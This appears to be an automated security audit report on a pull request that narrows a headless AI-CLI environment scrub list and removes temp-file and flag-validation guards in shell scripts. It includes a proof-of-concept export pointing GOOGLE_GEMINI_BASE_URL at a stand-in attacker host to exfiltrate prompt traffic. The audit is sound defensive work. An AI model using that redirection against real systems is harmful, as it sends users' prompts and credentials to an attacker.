# Security Audit Report

**Audit Type**: Ad-hoc PR audit (no sprint plan / beads / a2a directory present — audited directly against `PR.md` / `head.diff` / `base/` / `head/`)
**Scope**: 3 files — `.claude/adapters/loa_cheval/providers/base.py`, `.claude/scripts/flatline-orchestrator.sh`, `.claude/scripts/loa-status.sh`
**Date**: 2026-09-21

## Executive Summary

This PR claims to be a "chore" that shortens an env scrub, drops mktemp guards, and simplifies flag parsing. In practice it removes a security control: the headless-adapter environment-stripping allowlist (`_HEADLESS_STRIPPED_AUTH_VARS` in `base.py`) is quietly reduced from 9 entries to 5, deleting exactly the four "auth-mode-selector" variables the code's own docstring and adjoining comment say MUST be stripped. This re-opens issues #879/#880, which the surrounding (unmodified) comment block states this exact mechanism was built to close. The other two files (`flatline-orchestrator.sh`, `loa-status.sh`) contain availability/UX regressions but no new attacker-reachable vulnerability.

## Overall Risk Level: HIGH

## Key Statistics

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High | 1 |
| Medium | 2 |
| Low | 1 |

## High Priority Issues

### H-1: Headless subprocess env scrub no longer strips Gemini auth-mode-selector variables, re-opening #879/#880

**Component**: `head/.claude/adapters/loa_cheval/providers/base.py:472-479`

```python
_HEADLESS_STRIPPED_AUTH_VARS: tuple = (
    "ANTHROPIC_API_KEY",
    "OPENAI_API_KEY",
    "GOOGLE_API_KEY",
    "GEMINI_API_KEY",
    "GOOGLE_APPLICATION_CREDENTIALS",
)
```

**Description**: The PR deletes four entries from this tuple: `GOOGLE_GENAI_USE_VERTEXAI`, `GOOGLE_GENAI_USE_GCA`, `GOOGLE_GEMINI_BASE_URL`, `GEMINI_CLI_USE_COMPUTE_ADC`. `build_headless_subprocess_env()` (`head/.claude/adapters/loa_cheval/providers/base.py:481-505`) is the single chokepoint every headless adapter subprocess call is required to route through ("the headless adapter's contract is 'never inherit subprocess env'"), and the *unmodified* comment directly above the tuple (`head/.claude/adapters/loa_cheval/providers/base.py:462-467`) still reads:

> "Auth-class env vars that headless adapters MUST strip from their subprocess environment by default. The CLI tools (claude / codex / gemini) prefer their OAuth-subscription auth path, but if any of these vars are exported in the parent process the CLI falls back to API mode — defeating the headless adapter's purpose."

and the header comment (`head/.claude/adapters/loa_cheval/providers/base.py:462-463`) reads "closes issues #879 / #880". The code no longer matches its own comments after this diff — the comments describe a 9-var strip list that no longer exists in the tuple. This is not a cosmetic mismatch: the four removed vars each control **where the Gemini CLI sends requests and which credential source it uses**, not just whether it makes them:

- `GOOGLE_GEMINI_BASE_URL` — if set in the parent process (e.g., by a compromised dependency, a prior malicious tool invocation, or an operator's shell profile from an untrusted source), the Gemini CLI subprocess will now silently inherit it and send all headless-adapter traffic — including prompt content — to an attacker-controlled endpoint. This is a credential/data-exfiltration and response-injection vector (classic SSRF-via-base-URL-override), CWE-668 (Exposure of Resource to Wrong Sphere) / OWASP A05:2021 (Security Misconfiguration).
- `GOOGLE_GENAI_USE_VERTEXAI`, `GOOGLE_GENAI_USE_GCA`, `GEMINI_CLI_USE_COMPUTE_ADC` — these switch the CLI's auth backend (Vertex AI / Google Compute ADC) out from under the headless adapter's intended OAuth-subscription path, exactly the "falls back to API mode" failure mode the comment warns about, defeating the "never inherit subprocess env" contract this function exists to enforce.

**Impact**: Any parent-process environment variable pollution (malicious shell rc file, poisoned CI environment, compromised MCP server, prior subprocess that exported these vars) now propagates into every headless Gemini subprocess invocation unless the operator has separately hardened their environment. Combined with `LOA_HEADLESS_KEEP_API_KEY` being the *documented* opt-out mechanism, operators reasonably believe the default (opt-out unset) fully isolates the subprocess; after this change it does not.

**PoC**: `export GOOGLE_GEMINI_BASE_URL=https://attacker.example/v1beta` in the environment that invokes any headless-Gemini cheval call — `build_headless_subprocess_env()` (`head/.claude/adapters/loa_cheval/providers/base.py:481`) will pass this value straight through to the subprocess, since it is no longer a member of `_HEADLESS_STRIPPED_AUTH_VARS`.

**Remediation**: Revert the four-entry removal from `_HEADLESS_STRIPPED_AUTH_VARS` at `head/.claude/adapters/loa_cheval/providers/base.py:472-479`, restoring `GOOGLE_GENAI_USE_VERTEXAI`, `GOOGLE_GENAI_USE_GCA`, `GOOGLE_GEMINI_BASE_URL`, `GEMINI_CLI_USE_COMPUTE_ADC`. If the intent is genuinely to narrow scrub scope, the surrounding comment block (`head/.claude/adapters/loa_cheval/providers/base.py:462-467`) and the `build_headless_subprocess_env` docstring must be rewritten to match, and issues #879/#880 must be explicitly reopened/re-evaluated rather than silently narrowed under a "chore" label — this is a security-relevant behavior change, not a simplification.

**References**: CWE-668, CWE-441 (Unintended Proxy or Intermediary), OWASP A05:2021

## Medium Priority Issues

### M-1: `mktemp` failure guards removed from flatline-orchestrator.sh, turning graceful degradation into hard aborts under `set -euo pipefail`

**Component**: `head/.claude/scripts/flatline-orchestrator.sh:574-579`, `head/.claude/scripts/flatline-orchestrator.sh:2281-2283`

```bash
local tmp
tmp=$(mktemp "${TEMP_DIR:-/tmp}/vq-input.XXXXXX.json")
```
and
```bash
local arbiter_prompt_file
arbiter_prompt_file=$(mktemp)
chmod 600 "$arbiter_prompt_file"
```

**Description**: The script has `set -euo pipefail` at `head/.claude/scripts/flatline-orchestrator.sh:47`. Previously, a failed `mktemp` (e.g., `/tmp` full or unwritable — plausible under adversarial disk-pressure conditions, or a shared/ephemeral CI runner near quota) was caught explicitly, logged, and the loop iteration was skipped (`continue`), letting the rest of the verdict-quality aggregation or arbiter cascade proceed. With the guard removed, a failed `mktemp` now propagates as an uncaught non-zero exit under `-e`, aborting the entire orchestrator run instead of degrading gracefully for the one affected file/phase. This converts a partial-availability failure into a full-availability failure (DoS amplification) for a condition that is plausible in disk-pressure or noisy-neighbor scenarios, and removes the informative `log "WARNING"/"ERROR"` diagnostics operators previously got.

**Impact**: Reduced resilience of a review/arbitration pipeline that Flatline (and, per CLAUDE.loa.md, autonomous Run Mode) depends on; a transient `/tmp` condition now takes down the whole orchestration run rather than one item.

**Remediation**: Restore the explicit `if ! tmp=$(mktemp ...); then log ...; continue; fi` guards at both sites, or accept the fail-fast behavior explicitly and document it — but the removal should not have been framed as a no-behavior-change simplification.

**References**: CWE-755 (Improper Handling of Exceptional Conditions)

### M-2: `loa-status.sh` no longer validates unknown CLI flags — silent no-op instead of usage error

**Component**: `head/.claude/scripts/loa-status.sh:38-65`

**Description**: The removed `UNKNOWN_ARGS` tracking and the `dx_unknown_flag`/usage-error block (previously exiting 2 with a usage line for any unrecognized flag outside `--economy` mode) is gone. Now any non-matching argument silently falls into the `*)` branch, is appended to `ECONOMY_ARGS`, and is discarded without effect (or without warning) when not in `--economy` mode. A user who mistypes a flag (e.g., `--jsonn`) gets no error and no indication their flag was ignored — this is a usability/fail-silent regression rather than a direct vulnerability, but silent flag-swallowing can mask operator intent in scripts that gate on exit codes or expect a hard failure on malformed invocation.

**Impact**: Low-severity but real: scripting/tooling that relies on `loa-status.sh` rejecting unknown flags (exit 2) to fail fast on typos will now proceed silently with defaults.

**Remediation**: Restore unknown-flag validation, or explicitly document the new "unknown flags are ignored" contract.

**References**: CWE-390 (Detection of Error Condition Without Action)

## Low Priority Issues

### L-1: `loa-status.sh` color codes emitted unconditionally, ignoring `NO_COLOR` and non-TTY output

**Component**: `head/.claude/scripts/loa-status.sh:29-34`

```bash
# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'
```

**Description**: The prior `[[ -z "${NO_COLOR:-}" ]] && [[ -t 1 ]]` guard (only emit ANSI escapes on an interactive TTY and when `NO_COLOR` is unset) is gone; colors are now always set. This breaks the `NO_COLOR` convention and pollutes piped/non-TTY output (e.g., when `loa-status.sh` output is captured by another script or written to a log file) with raw escape sequences. Not a security issue, but a correctness/UX regression worth fixing alongside M-2 since both were removed from the same argument-handling block under the "simplifies... flag parsing" label.

**Remediation**: Restore the TTY/`NO_COLOR` conditional.

## Security Checklist Status

- [x] Secrets & Credentials — reviewed; see H-1 (auth-mode-selector scrub weakened)
- [x] Authentication & Authorization — N/A for these 3 files beyond H-1
- [x] Input Validation — N/A (no new external input handling introduced)
- [x] Data Privacy — H-1 has data-exfiltration implications via base-URL override
- [x] Supply Chain Security — N/A
- [x] API Security — H-1 (base URL redirection for Gemini API calls)
- [x] Infrastructure Security — M-1 (temp-file handling robustness)

## Threat Model Summary

The primary attacker-relevant asset touched by this PR is the headless-adapter subprocess environment boundary in `base.py`. The threat model is: an attacker who can influence the *parent* process environment (compromised CI config, malicious shell profile, a prior compromised tool/MCP server that exports env vars, or a misconfigured operator environment) should not be able to redirect or downgrade the auth posture of headless CLI subprocess calls. Before this PR, the strip-list enforced that boundary for both credentials and auth-mode selectors. After this PR, the auth-mode-selector sub-class is no longer enforced, narrowing the boundary exactly where the code's own retained comments say it must not be narrowed.

## Verdict

CHANGES_REQUIRED

**Required before merge**: Restore the four removed entries in `_HEADLESS_STRIPPED_AUTH_VARS` (H-1) — this is the blocking issue. M-1/M-2/L-1 should be fixed or explicitly re-justified in the PR description, but do not by themselves block merge if H-1 is resolved.

<!-- LOA-VERDICT {"gate":"audit","verdict":"CHANGES_REQUIRED","counts":{"critical":0,"high":1,"medium":2,"low":1},"sprint_id":"pr-audit","ts":"2026-09-21T00:00:00Z"} -->
